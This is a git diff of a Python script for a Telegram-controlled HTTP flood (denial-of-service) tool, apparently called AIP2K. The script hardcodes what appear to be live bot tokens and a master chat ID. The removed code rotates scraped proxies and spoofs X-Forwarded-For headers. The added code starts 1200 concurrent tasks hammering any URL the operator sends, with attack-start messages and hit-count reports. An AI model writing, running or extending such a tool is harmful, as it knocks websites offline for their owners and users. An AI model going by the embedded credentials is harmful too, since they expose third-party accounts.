@@ -3,7 +3,6 @@ import aiohttp
 import random
 from aiohttp import web
 
-# [AIP2K SOVEREIGN COMMAND CENTER - DEFINITIVE VERSION 2.0]
 MASTER_TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
 SLAVE_ARMY = {
     "S1": "8064983761:AAGEZRc9LASS7Fkifm3C3ebOdykCTTJUZ_0", "S2": "8460123410:AAE61k-8wPWE4hkmOxge802d8k7CTrhcfCE",
@@ -14,124 +13,93 @@ SLAVE_ARMY = {
 }
 MASTER_ID = 1938591484
 
-class AIP2K_Supreme_Core:
+class AIP2K_Identity_Engine:
     def __init__(self):
         self.session = None
-        self.targets = {}
-        self.proxies = []
-        self.soldier_active = {name: True for name in SLAVE_ARMY}
-        self.stats = {name: {"hits": 0, "errs": 0} for name in SLAVE_ARMY}
-        self.total_global_hits = 0
-        self.report_interval = 1000 
-        self.attack_delay = 0.000001
-        self.headers_pool = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
-            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) Safari/605.1.15"
-        ]
+        self.target = ""
+        self.success = 0
+        self.failed = 0
+        self.is_active = False
+        self.bot_identities = {} # স্টোরিং ইউজারনেম
+
+    async def _fetch_identities(self):
+        for key, token in SLAVE_ARMY.items():
+            try:
+                async with self.session.get(f"https://api.telegram.org/bot{token}/getMe") as r:
+                    data = await r.json()
+                    if data.get('ok'):
+                        self.bot_identities[key] = f"@{data['result']['username']}"
+                    else:
+                        self.bot_identities[key] = f"Unknown_{key}"
+            except:
+                self.bot_identities[key] = f"Offline_{key}"
 
     async def _notify(self, text):
+        print(f"[RENDER-LOG] {text}")
         url = f"https://api.telegram.org/bot{MASTER_TOKEN}/sendMessage"
         try:
-            async with self.session.post(url, json={'chat_id': MASTER_ID, 'text': text, 'parse_mode': 'Markdown'}) as r:
-                return await r.json()
+            async with self.session.post(url, json={'chat_id': MASTER_ID, 'text': text}) as r: pass
         except: pass
 
-    async def _fetch_proxies(self):
-        urls = [
-            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000",
-            "https://www.proxy-list.download/api/v1/get?type=http",
-            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
-        ]
-        while True:
-            temp = []
-            for u in urls:
-                try:
-                    async with self.session.get(u, timeout=10) as r:
-                        if r.status == 200: temp.extend((await r.text()).splitlines())
-                except: pass
-            if temp: self.proxies = list(set(temp))
-            await asyncio.sleep(300)
-
-    async def _strike_engine(self, name, target):
-        while target in self.targets and self.soldier_active[name]:
-            proxy = random.choice(self.proxies) if self.proxies else None
-            h = {
-                'User-Agent': random.choice(self.headers_pool),
-                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-                'Referer': 'https://www.google.com/',
-                'Accept-Encoding': 'gzip, deflate, br'
-            }
+    async def _strike(self):
+        while self.is_active and self.target:
+            h = {'User-Agent': f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(118,124)}.0.0.0"}
             try:
-                async with self.session.get(target, headers=h, proxy=f"http://{proxy}" if proxy else None, timeout=5) as r:
-                    if r.status == 200:
-                        self.stats[name]["hits"] += 1
-                        self.total_global_hits += 1
-                        if self.total_global_hits % self.report_interval == 0:
-                            asyncio.create_task(self._send_dashboard())
-                    else: self.stats[name]["errs"] += 1
-            except: self.stats[name]["errs"] += 1
-            await asyncio.sleep(self.attack_delay)
-
-    async def _send_dashboard(self):
-        msg = f"🛰 **AIP2K SUPREME MONITOR**\n🎯 **Total Success:** `{self.total_global_hits}`\n"
-        msg += "--------------------------\n"
-        for n, d in self.stats.items():
-            st = "⚡" if self.soldier_active[n] else "💤"
-            msg += f"{st} {n}: ✅ `{d['hits']}` | ❌ `{d['errs']}`\n"
-        await self._notify(msg)
+                async with self.session.get(self.target, headers=h, timeout=10) as r:
+                    if r.status == 200: self.success += 1
+                    else: self.failed += 1
+            except: self.failed += 1
+            
+            if (self.success + self.failed) % 1000 == 0:
+                report = f"📊 AIP2K LIVE REPORT\n✅ SUCCESS: {self.success}\n❌ FAILED: {self.failed}\n"
+                report += "--------------------\n"
+                for key, identity in self.bot_identities.items():
+                    report += f"🤖 {identity}: ACTIVE\n"
+                asyncio.create_task(self._notify(report))
+            await asyncio.sleep(0.000001)
 
     async def handle_updates(self):
         offset = 0
-        await self._notify("🔱 **AIP2K SYSTEM ONLINE**\nCommand structure locked.")
-        asyncio.create_task(self._fetch_proxies())
+        await self._fetch_identities()
+        await self._notify("🔱 AIP2K IDENTITY ENGINE ONLINE\nবট ইউজারনেম সিঙ্ক্রোনাইজ করা হয়েছে।")
         while True:
             try:
-                url = f"https://api.telegram.org/bot{MASTER_TOKEN}/getUpdates?offset={offset}&timeout=30"
+                url = f"https://api.telegram.org/bot{MASTER_TOKEN}/getUpdates?offset={offset}"
                 async with self.session.get(url) as r:
                     data = await r.json()
                     for update in data.get('result', []):
                         offset = update['update_id'] + 1
                         msg = update.get('message', {})
-                        cmd = msg.get('text', '').lower()
+                        text = msg.get('text', '')
                         if msg.get('from', {}).get('id') != MASTER_ID: continue
                         
-                        if cmd.startswith("http"):
-                            self.targets[cmd] = True
-                            await self._notify(f"⚔️ **WAR STARTED**\nTarget: {cmd}")
-                            for n in SLAVE_ARMY:
-                                self.soldier_active[n] = True
-                                for _ in range(350): asyncio.create_task(self._strike_engine(n, cmd))
+                        if text.startswith("http"):
+                            self.target = text
+                            self.is_active = True
+                            self.success = 0
+                            self.failed = 0
+                            await self._notify(f"⚔️ ATTACK STARTED ON: {text}")
+                            for _ in range(1200): asyncio.create_task(self._strike())
                         
-                        elif cmd == "/stop_all":
-                            self.targets.clear()
-                            for n in SLAVE_ARMY: self.soldier_active[n] = False
-                            await self._notify("🛑 **ALL SOLDIERS HALTED.**")
-
-                        elif cmd.startswith("/rest "):
-                            name = cmd.split()[1].upper()
-                            if name in self.soldier_active:
-                                self.soldier_active[name] = False
-                                await self._notify(f"💤 {name} is now resting.")
-
-                        elif cmd.startswith("/wake "):
-                            name = cmd.split()[1].upper()
-                            if name in self.soldier_active:
-                                self.soldier_active[name] = True
-                                if self.targets:
-                                    t = list(self.targets.keys())[0]
-                                    for _ in range(350): asyncio.create_task(self._strike_engine(name, t))
-                                await self._notify(f"🔥 {name} is back in action!")
-
-                        elif cmd == "/status":
-                            await self._send_dashboard()
+                        elif text == "/check":
+                            audit = "🔎 LIVE TOKEN & IDENTITY AUDIT:\n"
+                            for key, token in SLAVE_ARMY.items():
+                                async with self.session.get(f"https://api.telegram.org/bot{token}/getMe") as res:
+                                    d = await res.json()
+                                    if d.get('ok'):
+                                        audit += f"✅ @{d['result']['username']} (Online)\n"
+                                    else:
+                                        audit += f"❌ {key}: Token Dead\n"
+                            await self._notify(audit)
+                            
+                        elif text == "/stop":
+                            self.is_active = False
+                            await self._notify(f"🛑 STOPPED. FINAL HITS: {self.success}")
             except: await asyncio.sleep(1)
 
 async def main():
-    bot = AIP2K_Supreme_Core()
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0)) as sess:
-        bot.session = sess
+        bot = AIP2K_Identity_Engine(); bot.session = sess
         app = web.Application(); runner = web.AppRunner(app)
         await runner.setup(); await web.TCPSite(runner, '0.0.0.0', 10000).start()
         await bot.handle_updates()
